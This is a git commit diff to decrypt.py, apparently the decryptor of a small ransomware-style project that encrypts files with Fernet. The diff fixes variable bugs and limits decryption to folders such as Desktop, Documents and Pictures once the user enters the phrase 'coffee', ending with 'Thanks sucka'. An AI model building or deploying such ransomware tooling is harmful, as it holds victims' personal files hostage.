80508bab1081a8df255c819a5d4bc293fd107bc0
Abubudgie <abubudgie@Dunya.Dunya>
2023-10-19 14:49:59 +1100

    matched decrypt.py

--- decrypt.py
+++ decrypt.py
@@ -3,30 +3,35 @@ from cryptography.fernet import Fernet
 # This file does the opposite of ENCRYPTING
 
 def decrypt_file(file_path, key):
-	with open(file, "rb") as thefile:
+	with open(file_path, "rb") as thefile:
 		contents = thefile.read()
 	contents_decrypted = Fernet(key).decrypt(contents)
-	with open(file, "wb") as thefile:
+	with open(file_path, "wb") as thefile:
 		thefile.write(contents_decrypted)
 
 # loading secret key
-with open("thekey.key","rb") as key:
-	key = key.read()
+with open("thekey.key","rb") as key_file:
+	key = key_file.read()
 
 secretphrase = "coffee"
 user_phrase = input("Enter the secret phrase to decrypt your files\n")
 
+
+directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]
+
 if user_phrase == secretphrase:
 # this loop will go through each file in the files list and DECRYPT each one with the key	
 	for root, dirs, files in os.walk('.'):
-		for file in files:
-			# skipping files we dont want to decrypt
-			if file == 'encrypt.py' or file == 'decrypt.py' or file == 'thekey.key' or file == "dryrun.py" or file == "README.md":
-				continue
-			# getting file path
-			file_path = os.path.join(root, file)
-			# decryption
-			decrypt_file(file_path, key)
+		if any(dir in root for dir in directories):
+
+			for file in files:
+				# skipping files we dont want to decrypt
+				if file == 'encrypt.py' or file == 'decrypt.py' or file == 'thekey.key' or file == "dryrun.py" or file == "README.md":
+					continue
+				# getting file path
+				file_path = os.path.join(root, file)
+				# decryption
+				decrypt_file(file_path, key)
 
 	print("Thanks sucka")
 else: 
